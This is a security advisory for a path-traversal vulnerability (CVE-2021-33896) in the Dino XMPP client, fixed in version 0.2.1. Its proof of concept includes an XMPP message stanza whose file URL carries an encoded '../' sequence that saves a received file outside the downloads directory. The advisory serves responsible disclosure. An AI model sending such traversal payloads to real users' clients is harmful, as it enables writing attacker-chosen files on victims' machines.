---
title: 'Dino: Path Traversal on attachments'
published: '2021-10-01T14:22:18Z'
severity: Moderate
ghsa_id: GHSA-8r5v-99qc-6rrx
cve_id: CVE-2021-33896
weaknesses:
- id: CWE-27
  name: 'Path Traversal: ''dir/../../filename'''
products:
- ecosystem: n/a
  package_name: Dino
  affected_versions: 0.2.0 and earlier
  patched_versions: 0.2.1
cvss: null
credits:
- github_user_id: certlg
  name: certlg
  avatar: https://avatars.githubusercontent.com/u/74184708?s=40&v=4
---

### Summary
Dino is an XMPP based message client, with support for sending/receiving files. Due to a lack of sanitization against received filenames, a file transfer could be saved to an arbitrary path outside of the victim's intended downloads directory (`~/.local/share/dino/files/` by default).

### Severity
_Moderate_ - The victim must click the filename to accept the transfer, however the malicious path separators in the filename could be hidden since long filenames are ellipsized in the middle. The attacker can only create new files, not overwrite existing files.

### Proof of Concept
Host a file on an HTTP server:

```
echo test > file.bin
python3 http.server
```

Then send a message like the following (with matching body and url), which can be done in a python script using xmpppy library for example:

```
<message xmlns="jabber:client" to="test@yax.im"><body>http://localhost:8000/%2F..%2F..%2Ffile.bin</body><x xmlns="jabber:x:oob"><url>http://localhost:8000/%2F..%2F..%2Ffile.bin</url></x></message>
```

The victim receives a file transfer request named `/../../file.bin`, which when clicked will update the message to "File transfer failed". Observe that the file was downloaded to `~/.local/share/dino/file.bin`, outside of the intended directory (`~/.local/share/dino/files/`).

### Timeline
**Date reported**: June 3, 2021
**Date fixed**: June 7, 2021